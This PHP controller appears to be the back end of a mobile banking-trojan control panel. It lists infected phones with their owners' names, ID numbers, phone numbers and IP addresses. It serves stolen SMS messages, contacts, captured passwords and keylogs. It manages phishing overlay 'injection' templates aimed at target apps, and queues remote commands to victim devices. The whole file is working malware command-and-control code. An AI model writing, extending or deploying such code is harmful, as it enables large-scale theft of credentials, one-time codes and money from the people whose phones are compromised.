<?php
declare(strict_types=1);

namespace app\controller;

use think\facade\Db;
use think\facade\Request;

/**
 * /m/* adapter: exposes the v2.0-node front-end contract on top of the local
 * ThinkPHP + node-ws stack so the original panel UI runs unchanged.
 */
class MApiController
{
    protected string $path = '';
    protected string $method = '';
    protected ?array $user = null;
    protected array $body = [];

    public function dispatch()
    {
        $uri = (string)($_SERVER['REQUEST_URI'] ?? '/');
        $uri = explode('?', $uri)[0];
        $this->path = trim(preg_replace('#^/m/?#', '', $uri), '/');
        $this->method = strtoupper((string)($_SERVER['REQUEST_METHOD'] ?? 'GET'));

        $raw = file_get_contents('php://input') ?: '';
        $json = json_decode($raw, true);
        $this->body = is_array($json) ? $json : array_merge($_GET, $_POST);

        $seg = $this->path === '' ? [] : explode('/', $this->path);
        $head = $seg[0] ?? '';

        if ($head === 'login' && $this->method === 'POST') return $this->login();
        if ($head === 'ping' || $head === 'heartbeat') return $this->json(['success' => true, 'data' => ['pong' => time()]]);
        if ($head === 'authcheck') return $this->json(['success' => true, 'data' => null]);

        $this->user = $this->authenticate();
        if (!$this->user) {
            if ($this->method === 'GET') { error_log('[m-adapter] anonymous GET /m/' . $this->path); return $this->json([]); }
            return $this->json(['success' => false, 'error' => 'unauthorized'], 401);
        }
        if ($head === 'logout') return $this->json(['success' => true, 'data' => null]);

        try {
            return $this->route($seg);
        } catch (\Throwable $e) {
            return $this->json(['success' => false, 'error' => $e->getMessage(), 'data' => null], 500);
        }
    }

    protected function route(array $seg)
    {
        $head = $seg[0] ?? '';
        switch ($head) {
            case 'stats':         return $this->stats();
            case 'notices':       return $this->json($this->settingsList('notice'));
            case 'devices':       return $this->devices();
            case 'device-ids':    return $this->json(Db::table('fisher_devices')->column('device_id'));
            case 'groups':        return $this->groups();
            case 'group':         return $this->groupItem($seg[1] ?? null);
            case 'users':         return $this->users();
            case 'user':          return $this->userItem($seg);
            case 'device':        return $this->device($seg);
            case 'locale':        return $this->locale();
            case 'tg':            return $this->tg($seg);
            case 'turn-nodes':    return $this->turnNodes();
            case 'injections':    return $this->injections();
            case 'injection':     return $this->injectionItem($seg);
            case 'credentials':   return $this->credentials();
            case 'credential':    return $this->credentialItem($seg);
            case 'sms':           return $this->sms();
            case 'keylogs':       return $this->keylogs();
            case 'notifications': return $this->notifications($seg);
            case 'bapp':          return $this->appRule('fisher_black_apps', $seg, 'package_name');
            case 'sapp':          return $this->appRule('fisher_sensitive_apps', $seg, 'package_name');
            case 'blacklist':     return $this->appRule('fisher_black_apps', $seg, 'package_name');
            case 'paystg':        return $this->paystg($seg);
            case 'security':      return $this->security($seg);
            case 'autocommands':  return $this->json([]);
            case 'builds':        return $this->builds();
            case 'build':         return $this->buildItem($seg);
            case 'self':          return $this->json(['success' => true, 'data' => null]);
        }
        return $this->generic($seg);
    }
    // ================= auth =================
    protected function secret(): string
    {
        $s = (string)env('JWT.JWT_SECRET', '');
        if (strlen($s) < 32) $s = 'local-dev-secret-0123456789abcdef0123456789abcdef';
        return $s;
    }

    protected function b64(string $d): string { return rtrim(strtr(base64_encode($d), '+/', '-_'), '='); }

    protected function issueToken(array $u): string
    {
        $h = $this->b64(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
        $p = $this->b64(json_encode([
            'user_id'  => (int)$u['id'],
            'username' => $u['username'],
            'role'     => $u['role'],
            'exp'      => time() + 86400 * 30,
        ]));
        return $h . '.' . $p . '.' . $this->b64(hash_hmac('sha256', "$h.$p", $this->secret(), true));
    }

    protected function authenticate(): ?array
    {
        $hdr = (string)Request::header('authorization', '');
        if (!preg_match('/Bearer\s+(.+)/i', $hdr, $m)) return null;
        $parts = explode('.', trim($m[1]));
        if (count($parts) !== 3) return null;
        $expect = $this->b64(hash_hmac('sha256', $parts[0] . '.' . $parts[1], $this->secret(), true));
        if (!hash_equals($expect, $parts[2])) return null;
        $payload = json_decode((string)base64_decode(strtr($parts[1], '-_', '+/')), true);
        if (!is_array($payload) || (int)($payload['exp'] ?? 0) < time()) return null;
        $u = Db::table('fisher_users')->where('id', (int)$payload['user_id'])->find();
        if (!$u) return null;
        if (isset($u['enabled']) && !(int)$u['enabled']) return null;
        return $u;
    }

    protected function login()
    {
        $username = trim((string)($this->body['username'] ?? ''));
        $password = (string)($this->body['password'] ?? '');
        if ($username === '' || $password === '') return $this->json(['success' => false, 'error' => '用户名和密码不能为空'], 400);

        $u = Db::table('fisher_users')->where('username', $username)->find();
        $ok = $u && password_verify($password, (string)$u['password_hash']);
        try {
            Db::table('fisher_login_logs')->insert([
                'username' => $username, 'ip' => (string)Request::ip(),
                'user_agent' => substr((string)Request::header('user-agent', ''), 0, 255),
                'success' => $ok ? 1 : 0, 'created_at' => time(),
            ]);
        } catch (\Throwable $e) {}
        if (!$ok) return $this->json(['success' => false, 'error' => '用户名或密码错误'], 401);
        if (isset($u['enabled']) && !(int)$u['enabled']) return $this->json(['success' => false, 'error' => '该账号已被禁用'], 403);

        return $this->json([
            'token' => $this->issueToken($u),
            'role'  => $u['role'] ?: 'admin',
            'user'  => ['username' => $u['username'], 'role' => $u['role'] ?: 'admin'],
        ]);
    }

    // ================= dashboard =================
    protected function stats()
    {
        $total  = (int)Db::table('fisher_devices')->count();
        $online = (int)Db::table('fisher_devices')->where('is_connected', 1)->count();
        $byCountry = Db::table('fisher_devices')->field('country, COUNT(*) AS n')->group('country')->select()->toArray();
        $rows = [];
        foreach ($byCountry as $r) if (($r['country'] ?? '') !== '') $rows[] = ['country' => $r['country'], 'count' => (int)$r['n']];
        return $this->json([
            'devices_total'   => $total,
            'devices_online'  => $online,
            'online_count'    => $online,
            'devices_offline' => max(0, $total - $online),
            'users_total'     => (int)Db::table('fisher_users')->count(),
            'sms_total'       => (int)Db::table('fisher_sms_messages')->count(),
            'password_total'  => (int)Db::table('fisher_passwords')->count(),
            'injection_total' => (int)Db::table('fisher_injection_templates')->count(),
            'builds_total'    => (int)Db::table('fisher_apk_builds')->count(),
            'server_version'  => 'v2.0-node (local)',
            'uptime'          => time() - 3600,
            'countries'       => $rows,
            'generated_at'    => time(),
        ]);
    }

    protected function deviceRow(array $r): array
    {
        $owner = (string)($r['owner_username'] ?? '');
        $perms = $r['permissions'] ?? null;
        if (is_string($perms)) { $d = json_decode($perms, true); $perms = is_array($d) ? $d : []; }
        return [
            'id'               => (string)$r['device_id'],
            'device_id'        => (string)$r['device_id'],
            'alias'            => (string)($r['remark'] ?? ''),
            'remark'           => (string)($r['remark'] ?? ''),
            'brand'            => (string)($r['brand'] ?? ''),
            'model'            => (string)($r['model'] ?? ''),
            'os_version'       => (string)($r['os_version'] ?? ''),
            'app_version'      => (string)($r['app_version'] ?? ''),
            'app_name'         => (string)($r['app_name'] ?? ''),
            'battery'          => (int)($r['battery_level'] ?? 0),
            'charging'         => (bool)($r['is_charging'] ?? 0),
            'online'           => (bool)($r['is_connected'] ?? 0),
            'is_connected'     => (bool)($r['is_connected'] ?? 0),
            'screen_on'        => (bool)($r['is_screen_on'] ?? 0),
            'locked'           => (bool)($r['is_locked'] ?? 0),
            'has_access'       => !empty($perms) || (int)($r['accessibility_alive'] ?? 0) === 1,
            'accessibility'    => (bool)($r['accessibility_alive'] ?? 0),
            'is_device_owner'  => (bool)($r['is_device_owner'] ?? 0),
            'adb_connected'    => (bool)($r['adb_enabled'] ?? 0),
            'adb_enabled'      => (bool)($r['adb_enabled'] ?? 0),
            'ai_analyzed'      => false,
            'injection_count'  => 0,
            'crypto_apps'      => 0,
            'country'          => (string)($r['country'] ?? ''),
            'language'         => (string)($r['language'] ?? ''),
            'geo_location'     => (string)($r['geo_location'] ?? ''),
            'public_ip'        => (string)($r['public_ip'] ?? ''),
            'phone_number'     => (string)($r['phone_number'] ?? ''),
            'network_type'     => (string)($r['network_type'] ?? ''),
            'group_name'       => (string)($r['group_name'] ?? ''),
            'owner'            => $owner,
            'owner_username'   => $owner,
            'real_name'        => (string)($r['real_name'] ?? ''),
            'id_card'          => (string)($r['id_card'] ?? ''),
            'lock_screen_type' => (string)($r['lock_screen_type'] ?? ''),
            'screen_width'     => (int)($r['screen_width'] ?? 0),
            'screen_height'    => (int)($r['screen_height'] ?? 0),
            'local_service'    => (bool)($r['local_service_connected'] ?? 0),
            'black_screen'     => (bool)($r['black_screen_active'] ?? 0),
            'input_blocked'    => (bool)($r['device_input_blocked'] ?? 0),
            'expiry_date'      => (string)($r['expiry_date'] ?? ''),
            'last_seen'        => $this->ts($r['last_seen'] ?? 0),
            'first_seen'       => $this->ts($r['first_seen'] ?? 0),
            'created_at'       => $this->ts($r['created_at'] ?? 0),
            'last_seen_ts'     => (int)($r['last_seen'] ?? 0),
            'first_seen_ts'    => (int)($r['first_seen'] ?? 0),
        ];
    }
    protected function devices()
    {
        $q = Db::table('fisher_devices');
        $user = $this->user;
        if (($user['role'] ?? '') === 'user' && !empty($user['username'])) {
            $q = $q->where('owner_username', $user['username']);
        }
        $status = trim((string)Request::get('status', ''));
        if ($status === 'online')  $q = $q->where('is_connected', 1);
        if ($status === 'offline') $q = $q->where('is_connected', 0);
        $group = trim((string)Request::get('group', ''));
        if ($group !== '' && $group !== 'all') $q = $q->where('group_name', $group);
        $app = trim((string)Request::get('app_name', ''));
        if ($app !== '' && $app !== 'all') $q = $q->where('app_name', $app);
        $kw = trim((string)Request::get('q', ''));
        if ($kw !== '') {
            $q = $q->where(function ($w) use ($kw) {
                $w->whereLike('device_id', "%" . $kw . "%")
                  ->whereOr('remark', 'like', "%" . $kw . "%")
                  ->whereOr('model', 'like', "%" . $kw . "%");
            });
        }
        $country = trim((string)Request::get('country', ''));
        if ($country !== '') $q = $q->where('country', $country);
        if (Request::get('has_adb', '') !== '') $q = $q->where('adb_enabled', 1);
        if (Request::get('has_access', '') !== '') $q = $q->where('accessibility_alive', 1);
        if (Request::get('has_ai', '') !== '') $q = $q->where('id', 0);
        $from = trim((string)Request::get('date_from', ''));
        if ($from !== '') $q = $q->where('last_seen', '>=', (int)strtotime($from . ' 00:00:00'));
        $to = trim((string)Request::get('date_to', ''));
        if ($to !== '') $q = $q->where('last_seen', '<=', (int)strtotime($to . ' 23:59:59'));

        $total = (int)$q->count();
        $page = max(1, (int)Request::get('page', 1));
        $size = (int)Request::get('size', Request::get('pageSize', 50));
        if ($size < 1) $size = 50; if ($size > 500) $size = 500;
        $rows = $q->order('is_connected', 'desc')->order('last_seen', 'desc')
                  ->page($page, $size)->select()->toArray();

        $items = array_map([$this, 'deviceRow'], $rows);
        return $this->json([
            'items'        => $items,
            'data'         => $items,
            'total'        => $total,
            'page'         => $page,
            'pageSize'     => $size,
            'online_count' => (int)Db::table('fisher_devices')->where('is_connected', 1)->count(),
            'access_count' => (int)Db::table('fisher_devices')->where('accessibility_alive', 1)->count(),
            'adb_count'    => (int)Db::table('fisher_devices')->where('adb_enabled', 1)->count(),
            'ai_count'     => 0,
        ]);
    }

    protected function findDevice(string $id)
    {
        $r = Db::table('fisher_devices')->where('device_id', $id)->find();
        if (!$r && ctype_digit($id)) $r = Db::table('fisher_devices')->where('id', (int)$id)->find();
        return $r ?: null;
    }

    // ================= device sub-resources =================
    protected function device(array $seg)
    {
        $id = (string)($seg[1] ?? '');
        if ($id === '') return $this->devices();
        $dev = $this->findDevice($id);
        if (!$dev) return $this->json(['success' => false, 'error' => '设备不存在'], 404);
        $did = (string)$dev['device_id'];
        $sub = (string)($seg[2] ?? '');
        $arg = $seg[3] ?? null;

        if ($sub === '') {
            if ($this->method === 'DELETE') {
                Db::table('fisher_devices')->where('device_id', $did)->delete();
                return $this->json(['success' => true, 'data' => null]);
            }
            return $this->json($this->deviceRow($dev));
        }

        switch ($sub) {
            case 'note':
                if ($this->method === 'PUT' || $this->method === 'POST') {
                    Db::table('fisher_devices')->where('device_id', $did)
                        ->update(['remark' => (string)($this->body['remark'] ?? $this->body['note'] ?? '')]);
                }
                return $this->json(['success' => true, 'data' => null]);
            case 'group':
                if ($this->method === 'PUT' || $this->method === 'POST') {
                    Db::table('fisher_devices')->where('device_id', $did)
                        ->update(['group_name' => (string)($this->body['group'] ?? $this->body['group_name'] ?? '')]);
                }
                return $this->json(['success' => true, 'data' => null]);
            case 'pinned':
                return $this->json(['success' => true, 'data' => null]);
            case 'owner':
                if ($this->method === 'PUT' || $this->method === 'POST') {
                    Db::table('fisher_devices')->where('device_id', $did)
                        ->update(['owner_username' => (string)($this->body['owner'] ?? '')]);
                }
                return $this->json(['success' => true, 'data' => null]);
            case 'command':  return $this->deviceCommand($did);
            case 'sms':      return $this->deviceSms($did);
            case 'contacts': return $this->deviceContacts($did);
            case 'password': return $this->devicePasswords($did);
            case 'pwdin':    return $this->devicePwdIn($did, $arg);
            case 'logs':     return $this->deviceLogs($did, $arg);
            case 'apps':     return $this->json(Db::table('fisher_device_apps')->where('device_id', $did)->select()->toArray());
            case 'album':    return $this->json(['items' => [], 'total' => 0]);
            case 'payrec':   return $this->json([]);
            case 'phish':    return $this->json([]);
            case 'credentials':
                return $this->json(Db::table('fisher_passwords')->where('device_id', $did)->order('id', 'desc')->limit(200)->select()->toArray());
            case 'adb-mode':
            case 'install-apk':
            case 'transfer':
                return $this->json(['success' => true, 'data' => null]);
        }
        return $this->json(['success' => true, 'data' => []]);
    }

    protected function deviceCommand(string $did)
    {
        $cmd = (string)($this->body['command'] ?? $this->body['cmd'] ?? '');
        $params = $this->body['params'] ?? ($this->body['data'] ?? []);
        if ($cmd === '') return $this->json(['success' => false, 'error' => 'command required'], 400);
        if (!is_array($params)) $params = [];
        $id = 'cmd-' . bin2hex(random_bytes(6));
        Db::table('fisher_pending_commands')->insert([
            'device_id'    => $did,
            'command_json' => json_encode(['id' => $id, 'command' => $cmd, 'params' => (object)$params], JSON_UNESCAPED_UNICODE),
            'created_at'   => time(),
        ]);
        try {
            $ch = curl_init('http://127.0.0.1:8889/internal/device-command');
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode(['deviceId' => $did, 'command' => $cmd, 'params' => (object)$params], JSON_UNESCAPED_UNICODE),
                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT_MS => 800, CURLOPT_NOSIGNAL => 1,
            ]);
            curl_exec($ch); curl_close($ch);
        } catch (\Throwable $e) {}
        return $this->json(['success' => true, 'data' => ['id' => $id, 'queued' => true]]);
    }
    protected function deviceSms(string $did)
    {
        $rows = Db::table('fisher_sms_messages')->where('device_id', $did)->order('id', 'desc')->limit(500)->select()->toArray();
        return $this->json(array_map(function ($r) {
            $addr = (string)($r['address'] ?? $r['phone'] ?? $r['sender'] ?? '');
            $body = (string)($r['body'] ?? $r['content'] ?? '');
            return [
                'id' => (int)$r['id'], 'address' => $addr, 'phone' => $addr,
                'body' => $body, 'content' => $body,
                'type' => (int)($r['type'] ?? 1),
                'timestamp' => (int)($r['timestamp'] ?? $r['created_at'] ?? 0),
                'created_at' => (int)($r['created_at'] ?? 0),
            ];
        }, $rows));
    }

    protected function deviceContacts(string $did)
    {
        return $this->json(Db::table('fisher_contacts')->where('device_id', $did)->order('id', 'desc')->limit(2000)->select()->toArray());
    }

    protected function devicePasswords(string $did)
    {
        $rows = Db::table('fisher_passwords')->where('device_id', $did)->order('id', 'desc')->limit(500)->select()->toArray();
        return $this->json(array_map(function ($r) {
            $acct = (string)($r['account'] ?? $r['username'] ?? '');
            return [
                'id' => (int)$r['id'],
                'package' => (string)($r['package_name'] ?? $r['package'] ?? ''),
                'package_name' => (string)($r['package_name'] ?? ''),
                'app_name' => (string)($r['app_name'] ?? ''),
                'account' => $acct, 'username' => $acct,
                'password' => (string)($r['password'] ?? ''),
                'type' => (string)($r['type'] ?? ''),
                'created_at' => (int)($r['created_at'] ?? 0),
            ];
        }, $rows));
    }

    protected function devicePwdIn(string $did, $arg)
    {
        if ($arg && $this->method === 'DELETE') return $this->json(['success' => true, 'data' => null]);
        $rows = Db::table('fisher_password_inputs')->where('device_id', $did)->order('id', 'desc')->limit(500)->select()->toArray();
        return $this->json($rows);
    }

    protected function deviceLogs(string $did, $arg)
    {
        if ($arg && $this->method === 'DELETE') return $this->json(['success' => true, 'data' => null]);
        $rows = Db::table('fisher_cmd_results')->where('device_id', $did)->order('id', 'desc')->limit(300)->select()->toArray();
        return $this->json(array_map(function ($r) {
            $body = $r['body'] ?? '';
            return [
                'id' => (int)$r['id'],
                'logType' => (string)($r['command'] ?? ''),
                'type' => (string)($r['command'] ?? ''),
                'content' => is_string($body) ? $body : json_encode($body, JSON_UNESCAPED_UNICODE),
                'success' => (bool)($r['success'] ?? 0),
                'timestamp' => (int)($r['created_at'] ?? 0) * 1000,
            ];
        }, $rows));
    }

    // ================= misc resources =================
    protected function groups()
    {
        $rows = Db::table('fisher_device_groups')->order('id', 'asc')->select()->toArray();
        $out = [];
        foreach ($rows as $r) {
            $out[] = [
                'id' => (int)$r['id'],
                'name' => (string)$r['name'],
                'device_count' => (int)Db::table('fisher_devices')->where('group_name', $r['name'])->count(),
                'created_at' => $this->ts($r['created_at'] ?? 0),
            ];
        }
        return $this->json($out);
    }

    protected function groupItem($id)
    {
        if ($id === null) {
            $name = trim((string)($this->body['name'] ?? ''));
            if ($name !== '') { try { Db::table('fisher_device_groups')->insert(['name' => $name, 'created_at' => time()]); } catch (\Throwable $e) {} }
            return $this->json(['success' => true, 'data' => null]);
        }
        if ($this->method === 'DELETE') {
            Db::table('fisher_device_groups')->where('id', (int)$id)->delete();
            return $this->json(['success' => true, 'data' => null]);
        }
        if ($this->method === 'PUT' || $this->method === 'POST') {
            $old = Db::table('fisher_device_groups')->where('id', (int)$id)->find();
            $name = trim((string)($this->body['name'] ?? ''));
            if ($old && $name !== '') {
                Db::table('fisher_device_groups')->where('id', (int)$id)->update(['name' => $name]);
                Db::table('fisher_devices')->where('group_name', $old['name'])->update(['group_name' => $name]);
            }
        }
        return $this->json(['success' => true, 'data' => null]);
    }

    protected function users()
    {
        $rows = Db::table('fisher_users')->order('id', 'asc')->select()->toArray();
        $out = [];
        foreach ($rows as $r) {
            $perms = $r['permissions'] ?? null;
            if (is_string($perms)) { $d = json_decode($perms, true); $perms = is_array($d) ? $d : []; }
            $out[] = [
                'id' => (int)$r['id'],
                'username' => (string)$r['username'],
                'role' => (string)$r['role'],
                'permissions' => $perms ?: [],
                'enabled' => (bool)($r['enabled'] ?? 1),
                'expire_at' => (int)($r['expire_at'] ?? 0),
                'expire_at_str' => $this->ts($r['expire_at'] ?? 0),
                'max_devices' => (int)($r['max_devices'] ?? 0),
                'device_count' => (int)Db::table('fisher_devices')->where('owner_username', $r['username'])->count(),
                'created_at' => $this->ts($r['created_at'] ?? 0),
                'avatar' => (string)($r['avatar'] ?? ''),
                'tg_bind' => false,
            ];
        }
        return $this->json($out);
    }

    protected function userItem(array $seg)
    {
        $id = (int)($seg[1] ?? 0);
        $sub = (string)($seg[2] ?? '');
        if ($this->method === 'POST' && $id === 0) {
            $name = trim((string)($this->body['username'] ?? ''));
            $pass = (string)($this->body['password'] ?? '');
            if ($name === '' || $pass === '') return $this->json(['success' => false, 'error' => '用户名和密码不能为空'], 400);
            if (Db::table('fisher_users')->where('username', $name)->find()) return $this->json(['success' => false, 'error' => '用户名已存在'], 409);
            Db::table('fisher_users')->insert([
                'username' => $name,
                'password_hash' => password_hash($pass, PASSWORD_BCRYPT),
                'role' => (string)($this->body['role'] ?? 'user'),
                'permissions' => json_encode($this->body['permissions'] ?? [], JSON_UNESCAPED_UNICODE),
                'enabled' => 1, 'created_at' => time(),
                'max_devices' => (int)($this->body['max_devices'] ?? 100),
            ]);
            return $this->json(['success' => true, 'data' => null]);
        }
        if ($id > 0) {
            if ($this->method === 'DELETE') {
                Db::table('fisher_users')->where('id', $id)->delete();
                return $this->json(['success' => true, 'data' => null]);
            }
            $patch = [];
            if ($sub === 'password') {
                $p = (string)($this->body['password'] ?? '');
                if ($p !== '') $patch['password_hash'] = password_hash($p, PASSWORD_BCRYPT);
            } elseif ($sub === 'username') {
                $patch['username'] = (string)($this->body['username'] ?? '');
            } elseif ($sub === 'remark') {
                $patch['remark'] = (string)($this->body['remark'] ?? '');
            } elseif ($sub === 'expiry') {
                $patch['expire_at'] = (int)($this->body['expire_at'] ?? 0);
            } elseif ($sub === 'unbind-telegram' || $sub === 'tg-bind') {
                // local mode: telegram disabled
            } else {
                foreach (['role', 'enabled', 'max_devices'] as $k) {
                    if (array_key_exists($k, $this->body)) $patch[$k] = $this->body[$k];
                }
            }
            if ($patch) Db::table('fisher_users')->where('id', $id)->update($patch);
        }
        return $this->json(['success' => true, 'data' => null]);
    }
    protected function locale()
    {
        if ($this->method !== 'GET') {
            $this->settingPut('locale', json_encode($this->body, JSON_UNESCAPED_UNICODE));
            return $this->json(['success' => true, 'data' => null]);
        }
        $v = Db::table('fisher_settings')->where('key', 'locale')->value('value');
        $d = $v ? json_decode((string)$v, true) : null;
        return $this->json(is_array($d) ? $d : ['enabled' => false, 'items' => []]);
    }

    protected function tg(array $seg)
    {
        $all = Db::table('fisher_settings')->whereLike('key', 'tg_%')->select()->toArray();
        $map = [];
        foreach ($all as $r) $map[$r['key']] = $r['value'];
        if (($seg[1] ?? '') === 'config') {
            return $this->json([
                'enabled' => !empty($map['tg_bot_token']),
                'bot_token' => (string)($map['tg_bot_token'] ?? ''),
                'chat_id' => (string)($map['tg_chat_id'] ?? ''),
                'proxy' => (string)($map['tg_proxy'] ?? ''),
                'notify_new_device' => (bool)($map['tg_notify_new_device'] ?? 0),
                'notify_sms' => (bool)($map['tg_notify_sms'] ?? 0),
            ]);
        }
        return $this->json(['success' => true, 'data' => $map]);
    }

    protected function turnNodes()
    {
        $v = Db::table('fisher_settings')->where('key', 'turn_nodes')->value('value');
        $d = $v ? json_decode((string)$v, true) : [];
        return $this->json(is_array($d) ? $d : []);
    }

    protected function injections()
    {
        $rows = Db::table('fisher_injection_templates')->order('id', 'desc')->limit(500)->select()->toArray();
        return $this->json(array_map(function ($r) { return $this->injRow($r); }, $rows));
    }

    protected function injRow(array $r): array
    {
        return [
            'id' => (int)$r['id'],
            'name' => (string)($r['name'] ?? ''),
            'title' => (string)($r['name'] ?? ''),
            'package' => (string)($r['package_name'] ?? ''),
            'package_name' => (string)($r['package_name'] ?? ''),
            'app_name' => (string)($r['app_name'] ?? ''),
            'country' => (string)($r['country'] ?? ''),
            'lang' => (string)($r['lang'] ?? ''),
            'auto' => (bool)($r['auto_inject'] ?? 0),
            'enabled' => (bool)($r['enabled'] ?? 1),
            'html' => '',
            'created_at' => (int)($r['created_at'] ?? 0),
        ];
    }

    protected function injectionItem(array $seg)
    {
        $id = (int)($seg[1] ?? 0);
        $sub = (string)($seg[2] ?? '');
        if ($this->method === 'POST' && $id === 0) {
            Db::table('fisher_injection_templates')->insert([
                'name' => (string)($this->body['name'] ?? 'template'),
                'package_name' => (string)($this->body['package_name'] ?? $this->body['package'] ?? ''),
                'app_name' => (string)($this->body['app_name'] ?? ''),
                'html' => (string)($this->body['html'] ?? ''),
                'created_at' => time(),
            ]);
            return $this->json(['success' => true, 'data' => null]);
        }
        if ($id > 0) {
            if ($this->method === 'DELETE') {
                Db::table('fisher_injection_templates')->where('id', $id)->delete();
                return $this->json(['success' => true, 'data' => null]);
            }
            if ($sub === 'html') {
                $r = Db::table('fisher_injection_templates')->where('id', $id)->find();
                return $this->json(['html' => (string)($r['html'] ?? ''), 'name' => (string)($r['name'] ?? '')]);
            }
            $patch = [];
            foreach (['name', 'package_name', 'app_name', 'html', 'country', 'lang'] as $k) {
                if (array_key_exists($k, $this->body)) $patch[$k] = $this->body[$k];
            }
            if ($sub === 'auto') $patch['auto_inject'] = (int)($this->body['auto'] ?? $this->body['enabled'] ?? 0);
            if ($patch) Db::table('fisher_injection_templates')->where('id', $id)->update($patch);
        }
        return $this->json(['success' => true, 'data' => null]);
    }

    protected function credentials()
    {
        return $this->json(Db::table('fisher_passwords')->order('id', 'desc')->limit(500)->select()->toArray());
    }

    protected function credentialItem(array $seg)
    {
        $id = (int)($seg[1] ?? 0);
        if ($this->method === 'DELETE' && $id > 0) {
            Db::table('fisher_passwords')->where('id', $id)->delete();
            return $this->json(['success' => true, 'data' => null]);
        }
        return $this->json(Db::table('fisher_passwords')->where('id', $id)->find() ?: null);
    }

    protected function sms()
    {
        return $this->json(Db::table('fisher_sms_messages')->order('id', 'desc')->limit(500)->select()->toArray());
    }

    protected function keylogs()
    {
        return $this->json(Db::table('fisher_cmd_results')->order('id', 'desc')->limit(500)->select()->toArray());
    }

    protected function notifications(array $seg)
    {
        if ($this->method === 'DELETE') return $this->json(['success' => true, 'data' => null]);
        return $this->json([]);
    }
    protected function appRule(string $table, array $seg, string $col)
    {
        $id = $seg[1] ?? null;
        if ($id !== null && $this->method === 'DELETE') {
            Db::table($table)->where('id', (int)$id)->delete();
            return $this->json(['success' => true, 'data' => null]);
        }
        if ($this->method === 'POST') {
            $val = (string)($this->body[$col] ?? $this->body['package'] ?? $this->body['package_name'] ?? $this->body['value'] ?? '');
            if ($val !== '') {
                try { Db::table($table)->insert([$col => $val, 'created_at' => time()]); } catch (\Throwable $e) {}
            }
            return $this->json(['success' => true, 'data' => null]);
        }
        return $this->json(Db::table($table)->order('id', 'desc')->select()->toArray());
    }

    protected function paystg(array $seg)
    {
        $id = $seg[1] ?? null;
        if ($id !== null && $this->method === 'DELETE') {
            Db::table('fisher_payment_strategies')->where('id', (int)$id)->delete();
            return $this->json(['success' => true, 'data' => null]);
        }
        return $this->json(Db::table('fisher_payment_strategies')->order('id', 'desc')->select()->toArray());
    }

    protected function security(array $seg)
    {
        $what = (string)($seg[1] ?? '');
        if ($this->method === 'DELETE') {
            if ($what === 'logs') Db::table('fisher_login_logs')->delete(true);
            if ($what === 'login-attempts') Db::table('fisher_login_logs')->where('success', 0)->delete(true);
            return $this->json(['success' => true, 'data' => null]);
        }
        if ($what === 'ip-whitelist') {
            $v = Db::table('fisher_settings')->where('key', 'ip_whitelist')->value('value');
            $d = $v ? json_decode((string)$v, true) : [];
            return $this->json(is_array($d) ? $d : []);
        }
        return $this->json(Db::table('fisher_login_logs')->order('id', 'desc')->limit(200)->select()->toArray());
    }

    protected function builds()
    {
        return $this->json(Db::table('fisher_apk_builds')->order('id', 'desc')->limit(200)->select()->toArray());
    }

    protected function buildItem(array $seg)
    {
        return $this->json(['success' => true, 'data' => []]);
    }

    // ================= helpers =================
    protected function settingPut(string $key, string $value): void
    {
        $row = Db::table('fisher_settings')->where('key', $key)->find();
        if ($row) Db::table('fisher_settings')->where('key', $key)->update(['value' => $value]);
        else Db::table('fisher_settings')->insert(['key' => $key, 'value' => $value]);
    }

    protected function settingsList(string $prefix): array
    {
        $rows = Db::table('fisher_settings')->whereLike('key', $prefix . '%')->select()->toArray();
        return $rows ?: [];
    }

    protected function generic(array $seg)
    {
        $head = $seg[0] ?? '';
        error_log('[m-adapter] ' . $this->method . ' /m/' . $this->path);
        if ($this->method === 'GET') return $this->json([]);
        return $this->json(['success' => true, 'data' => null]);
    }

    protected function ts($v): string
    {
        $v = (int)$v;
        return $v > 0 ? date('Y-m-d H:i:s', $v) : '';
    }

    protected function json($data, int $code = 200)
    {
        return json($data, $code);
    }
}
